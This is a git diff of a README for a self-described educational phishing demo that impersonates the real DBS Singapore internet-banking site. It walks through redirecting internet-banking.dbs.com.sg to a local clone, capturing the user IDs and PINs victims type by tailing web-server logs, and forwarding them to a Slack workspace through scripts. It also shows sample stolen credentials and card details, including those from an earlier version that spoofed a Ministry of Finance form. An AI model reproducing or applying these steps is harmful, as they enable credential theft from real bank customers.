@@ -4,16 +4,16 @@ THIS PROJECT IS MADE FOR DEMO AND EDUCATION PURPOSE ONLY AND HENCE, THE USE OF T
 
 I, SHALL NOT BE LIABLE FOR ANY DAMAGED OR LEGAL CONSENTS BY YOUR USAGE OF THIS PROJECT.
 
-## INTRODUCTION
+## 1. INTRODUCTION
 
 The following demonstration illustrates how an attacker is able to create a public wireless network, and spoof your data.
 At the same time, the demonstration also showcase how the attacker processes your information and impersonate themselves as someone of authority and obtain more of your sensitive data such as credit card information.
 
-## VIDEO DEMO
+## 2. VIDEO DEMO
 
 No video yet, I will make one soon. ^_^. 
 
-## PREREQUISITE
+## 3. PREREQUISITE
 
 #### In this section, I will be explaining what are the required packages before we start the installation.
 1. Ubuntu 18.04 and above
@@ -22,8 +22,10 @@ No video yet, I will make one soon. ^_^.
 > apt install apache
 3. git package
 > apt install git
+4. Slack workspace webhook integration. (OPTIONAL)
+> https://api.slack.com/apps?new_app=1
 
-## INSTALLATION
+## 4. INSTALLATION
 
 #### In this section, I will be explaining how to put the files into the webserver and ensure it loads.
 
@@ -33,7 +35,7 @@ No video yet, I will make one soon. ^_^.
 2. Move the NUS-phishing-DBS folder into the Nginx web server's root directory and rename it into m3.
 > mv -v NUS-phishing-DBS/* /var/www/html
 
-3. Associate the domain name dbs.com.sg with localhost IP address.
+3. Associate the domain name internet-banking.dbs.com.sg with localhost IP address.
 > nano /etc/hosts
 
 3.1 Amend the following line from
@@ -42,83 +44,91 @@ No video yet, I will make one soon. ^_^.
 
 TO
 
->> 127.0.0.1    dbs.com.sg
+>> 127.0.0.1    internet-banking.dbs.com.sg
 
 4. Start apache web server
 
 > service apache2 start
 
-## EXECUTION (METHOD 1 - TERMINAL BASE)
+## 4. EXECUTION (METHOD 1 - TERMINAL BASE)
 
 #### In this section, I will be explaining how will the frontend (victim's browser) sends the data to the backend (attacker's server) seamlessly.
 
-1. Load the website on your browser.
+4.1 Load the website on your browser.
 
-> http://dbs.com.sg/IB/Welcome
+> http://internet-banking.dbs.com.sg/IB/Welcome
 
-2. Start capturing the user inputs by opening 1 terminal.
+4.2 Start capturing the user inputs by opening 1 terminal.
 
-##### 2.1 Terminal
-> tail -f /var/log/nginx/access.log | awk '/NRIC/ {print "\n" "Entry " NR " | " $1 $2 $4 $5 " - WIFI HOTSPOT""\n" "\n"  $7}'
+##### 4.2.1 Terminal
 
-3. Go through all the steps in entering the details (VERY SIMPLE!!!)
+Give Permission!
 
-## EXECUTION (METHOD 2 - SLACK INTEGRATION)
+> sudo chmod 777 /var/html/www/trace.sh
+
+Run it!
+
+> ./var/html/www/trace.sh 
+
+4.3 Go through all the steps in entering the details (VERY SIMPLE!!!)
+
+## 5. EXECUTION (METHOD 2 - SLACK INTEGRATION)
 
 #### In this section, I will be explaining how will the backend (attacker's terminal) sends the data from the frontend (victim's input) to a slackspace seamlessly. (API Integration link can be found at PREREQUISITE.)
 
-1. Load the website on your browser.
+5.1 Load the website on your browser.
 
-> http://dbs.com.sg/IB/Welcome
+> http://internet-banking.dbs.com.sg/IB/Welcome
 
-2. Start capturing the user inputs by opening 1 terminal.
+5.2 Go through all the steps in entering the details (VERY SIMPLE!!!)
 
-##### 2.1 Terminal
-> tail -f /var/log/nginx/access.log | awk '/NRIC/ {print "\n" "Entry " NR " | " $1 $2 $4 $5 " - WIFI HOTSPOT""\n" "\n"  $7}'
+5.3 Start capturing the user inputs by opening 1 terminal.
 
-3. Go through all the steps in entering the details (VERY SIMPLE!!!)
+##### 5.3.1 Terminal (Send it to slack)
+Give Permission!
+
+> sudo chmod 777 /var/html/www/2slack.sh
+
+Run it!
+
+> ./var/html/www/2slack.sh 
 
 ## SAMPLE OUTPUT (END OF DEMO).
 
 #### In the last section, we will be analysing the sample data output from Terminal 1 and Terminal 2 ( REFER TO EXECUTION(2) )
 
-##### 1. Terminal 1 ( EXECUTION(2)(1) )
+##### 1. METHOD 1
 
-The data presented in this output is the input from the rogue Wireless@SG website.
+The data presented in this output is the input from the rogue DBS iBanking website.
 
-> Entry 4 | 172.32.0.100-[25/Jul/2020:15:14:57+0800] - WIFI HOTSPOT
-> 
-> /detected.html?title=Title&input=Mr&name=Full+Name&input=John&NRIC=Last+4+digits+of+NRIC&input=345D&postal+code=Postal+Code&input=123456&address=Address&input=123+Tamp+f
+>UID=1234&PIN=12341234&submit=
 
 From the above data, we can safely deduce the following information:
 
-> Title: Mr
+> User ID: 1234
 >
-> Full Name: John
->
-> Last 4 digits of NRIC: 345D
->
-> Poster Code: 123456
->
-> Address: 123 Tamp f
+> PIN: 1234
 
-##### 2. Terminal 2 ( EXECUTION(2)(2) )
+##### 2. METHOD 2 (YOU NEED TO OPEN YOUR SLACK WORKSPACE TO SEE IT)
 
-The data presented in this output is the input from the rogue Ministry of Finance website. 
+The data presented in this output is the input from the rogue DBS iBanking website. 
 
-> Entry 3 | 172.32.0.100-[25/Jul/2020:15:13:21+0800] - WIFI HOTSPOT
+>DBS Banking Credentials
+>UID=dsdsd&PIN=sdsds&submit=
+>UID=HACKNROLL%231&PIN=20202020&submit=
+>UID=HNR2020%232&PIN=1324EWERW&submit=
+>UID=12345T&PIN=123456&submit=
+>UID=dfd&PIN=123&submit=
+>UID=ee&PIN=dfd&submit=
+>UID=1234&PIN=12341234&submit=
+
+From the above data, we can safely deduce the following information: (TAKE THE LATEST DATA)
+
+> User ID: 1234
 >
-> /MOF%20|%20Seek%20Permission%20Form_files/FormFEDYA.html?REF=2020_SPF_MOF&CARD=99999999999999999&CVV=999&EXP=99%2F99
+> PIN: 1234
 
-From the above data, we can safely deduce the following information:
-
-> Card Number: 99999999999999999
->
-> CVV: 999
->
-> Exp Date: 99/99
-
-#### NOTE: TO ENSURE THE CORROSPONDING VICTIM FROM TERMINAL 1 AND TERMINAL 2 DATA MATCHES, ALWAYS CHECK THE TIME AND DATE OF INPUT.
+#### NOTE: TO ENSURE THE YOU GET A MESSAGE TO YOUR SLACK WORKSPACE, CHANGE THE CONTENTS IN > 2slack.sh < ACCORDINGLY!
 
 ##### ====================================================================================================================
 
@@ -127,5 +137,3 @@ From the above data, we can safely deduce the following information:
 #### ZHANG TIANCI CONAN
 #### TELEGRAM: https://t.me/conan97zhang
 #### INSTAGRAM: https://instagram.com/conan97zhang
-
-@ Curriculum Development Team, Cyber Youth SIngapore
